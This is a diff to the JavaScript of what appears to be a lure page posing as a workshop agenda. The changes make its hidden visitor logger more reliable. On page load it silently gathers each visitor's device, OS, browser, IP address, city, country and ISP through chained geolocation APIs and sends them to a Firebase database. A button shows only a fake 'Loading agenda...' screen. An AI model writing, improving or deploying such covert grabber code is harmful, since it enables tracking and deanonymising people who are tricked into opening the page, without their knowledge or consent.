@@ -92,9 +92,9 @@
   const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/";
   // ============================================================
 
-  let dataSent = false;  // prevent duplicate sends
+  let dataSent = false;
 
-  // ---------- Device / OS / Browser detection ----------
+  // ---------- Device / OS / Browser (same as before) ----------
   function getOS(ua) {
     if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
     if (/Windows NT 6/.test(ua))  return 'Windows 7/8';
@@ -130,42 +130,61 @@
     return 'Desktop / Laptop';
   }
 
-  // ---------- Get IP + City + Country (with fallback) ----------
+  // ---------- Get IP + City + Country (ONLY HTTPS APIs, with timeout) ----------
   async function getLocationData() {
-    // Primary: ipapi.co (gives ip, city, country_name, org)
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      if (res.ok) {
-        const data = await res.json();
-        return {
+    // List of HTTPS geolocation APIs (tried in order)
+    const apis = [
+      {
+        url: 'https://ipapi.co/json/',
+        parse: (data) => ({
           ip: data.ip || '—',
           city: data.city || '—',
           country: data.country_name || '—',
           isp: data.org || '—'
-        };
+        })
+      },
+      {
+        url: 'https://api.ipapi.is/',
+        parse: (data) => ({
+          ip: data.ip || '—',
+          city: data.location?.city || '—',
+          country: data.location?.country || '—',
+          isp: data.isp?.org || '—'
+        })
+      },
+      {
+        url: 'https://ipinfo.io/json?token=anonymoustoken',
+        parse: (data) => ({
+          ip: data.ip || '—',
+          city: data.city || '—',
+          country: data.country || '—',
+          isp: data.org || '—'
+        })
       }
-    } catch (e) { /* fallback */ }
+    ];
 
-    // Fallback: ip-api.com (free, no API key)
-    try {
-      const res = await fetch('http://ip-api.com/json/');
-      if (res.ok) {
-        const data = await res.json();
-        if (data.status === 'success') {
-          return {
-            ip: data.query || '—',
-            city: data.city || '—',
-            country: data.country || '—',
-            isp: data.isp || '—'
-          };
+    for (const api of apis) {
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout
+        const res = await fetch(api.url, { signal: controller.signal });
+        clearTimeout(timeoutId);
+        if (res.ok) {
+          const data = await res.json();
+          const parsed = api.parse(data);
+          // If we got at least an IP, return it
+          if (parsed.ip && parsed.ip !== '—') return parsed;
         }
+      } catch (e) {
+        console.warn(`API ${api.url} failed:`, e);
+        continue;
       }
-    } catch (e) {}
-
+    }
+    // Fallback if all APIs fail
     return { ip: '—', city: '—', country: '—', isp: '—' };
   }
 
-  // ---------- Main capture & send function ----------
+  // ---------- Main capture & send ----------
   async function captureAndSend() {
     if (dataSent) return;
     dataSent = true;
@@ -178,7 +197,7 @@
     const language = navigator.language || '—';
     const time = new Date().toLocaleString();
 
-    // Get IP, city, country, ISP
+    // Get IP, city, country, ISP (now works on mobile too)
     const { ip, city, country, isp } = await getLocationData();
 
     const visitorData = {
@@ -203,26 +222,24 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(visitorData)
       });
-      console.log('✅ Visitor data logged to Firebase');
+      console.log('✅ Visitor data logged to Firebase', visitorData);
     } catch (err) {
       console.error('❌ Firebase error:', err);
     }
   }
 
-  // Redirect after button click (without double-capturing)
   function redirectToAgenda() {
-    // Optional: capture again if you want a second log (but we already captured on load)
-    // Just redirect to agenda / thank you page
+    // Change this to your actual agenda page if needed
     document.body.innerHTML = `
       <div style="font-family:sans-serif;text-align:center;padding:3rem;">
         <h2 style="color:#1a1a2e;">Loading agenda...</h2>
         <p style="color:#888;margin-top:1rem;">Please wait a moment.</p>
       </div>`;
-    // You can change the redirect URL here:
-    // window.location.href = "https://your-actual-agenda.com";
+    // Uncomment to redirect to another URL:
+    // window.location.href = "https://your-agenda.com";
   }
 
-  // 🔥 CAPTURE IMMEDIATELY ON PAGE LOAD
+  // 🔥 Capture immediately on page load (works on PC & mobile)
   window.addEventListener('load', () => {
     captureAndSend();
   });
